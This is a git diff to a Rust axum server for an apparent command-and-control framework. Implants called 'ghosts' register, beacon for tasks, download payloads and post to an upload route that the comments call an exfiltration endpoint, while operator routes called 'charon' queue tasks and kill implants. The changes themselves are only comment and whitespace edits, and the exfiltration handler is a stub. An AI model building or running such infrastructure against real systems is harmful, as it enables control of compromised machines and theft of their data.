@@ -8,14 +8,6 @@ use serde::{Deserialize, Serialize};
 use std::sync::Arc;
 use uuid::Uuid;
 
-// GENERAL CONCEPT
-// server will handle implants
-// each implant has some identifying properties
-// -> for now they will be very generic
-// each implant can get tasks
-// each implant can send back its state
-// -> generalize that into a message for now
-
 // === ENUMS ===
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
 #[serde(rename_all = "lowercase")]
@@ -35,7 +27,7 @@ pub struct Ghost {
     pub sleep_interval: Option<i64>,
     pub jitter_percent: Option<i16>,
     pub update_pending: Option<bool>,
-    pub last_seen: Option<i64>      // unix timestamp
+    pub last_seen: Option<i64>  // unix timestamp
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -94,7 +86,7 @@ pub struct ServerState {
 }
 
 // === API handlers ===
-// GHOST
+// === GHOST
 async fn handle_ghost_register(
     State(state): State<Arc<ServerState>>,
     Json(mut ghost): Json<Ghost>
@@ -176,7 +168,7 @@ async fn handle_ghost_upload() {
     todo!("ghost exfiltration todo")
 }
 
-// CHARON
+// === CHARON
 async fn handle_charon_list_ghosts(State(state): State<Arc<ServerState>>) -> Json<Vec<Ghost>> {
     let list: Vec<Ghost> = state.ghosts.iter().map(|e| e.value().clone()).collect();
     Json(list)
@@ -281,20 +273,20 @@ pub fn app(state: Arc<ServerState>) -> Router {
     let ghost_routes = Router::<Arc<ServerState>>::new()
         .route("/register", post(handle_ghost_register))        // ghost init (register)
         .route("/heartbeat", post(handle_ghost_heartbeat))      // ghosts will beacon to get tasks from here (or will just beacon their status and get back whether or not they have a task; smth to think about)
-        .route("/files/{id}", get(handle_ghost_file_download))   // payload/implant download point
+        .route("/files/{id}", get(handle_ghost_file_download))  // payload/implant download point
         .route("/upload", post(handle_ghost_upload));           // exfiltration endpoint for data dumps
 
     let charon_routes = Router::<Arc<ServerState>>::new()
-        .route("/ghosts", get(handle_charon_list_ghosts))           // list active GHOSTs
-        .route("/ghosts/{id}", get(handle_charon_get_ghost).post(handle_charon_update_ghost))         // get details about a GHOST or update its config
-        .route("/ghosts/{id}/task", post(handle_charon_queue_task))  // assign a task to GHOST
+        .route("/ghosts", get(handle_charon_list_ghosts))               // list active GHOSTs
+        .route("/ghosts/{id}", get(handle_charon_get_ghost).post(handle_charon_update_ghost))   // get details about a GHOST or update its config
+        .route("/ghosts/{id}/task", post(handle_charon_queue_task))     // assign a task to GHOST
         .route("/ghosts/{id}/tasks", get(handle_charon_get_ghost_tasks))    // get all tasks for GHOST
-        .route("/tasks/{id}", get(handle_charon_get_task_details))    // get single task details
-        .route("/ghosts/{id}/kill", post(handle_charon_kill_ghost)); // killswitch for GHOST
+        .route("/tasks/{id}", get(handle_charon_get_task_details))      // get single task details
+        .route("/ghosts/{id}/kill", post(handle_charon_kill_ghost));    // killswitch for GHOST
 
     // init router with route -> handler mapping
     Router::<Arc<ServerState>>::new()
-        .route("/health", get(|| async { "OK" }))       // simple healthcheck for docker compose if it happens
+        .route("/health", get(|| async { "OK" }))   // simple healthcheck for docker compose if it happens
         .nest("/api/v1/ghost", ghost_routes)
         .nest("/api/v1/charon", charon_routes)
         .with_state(state)
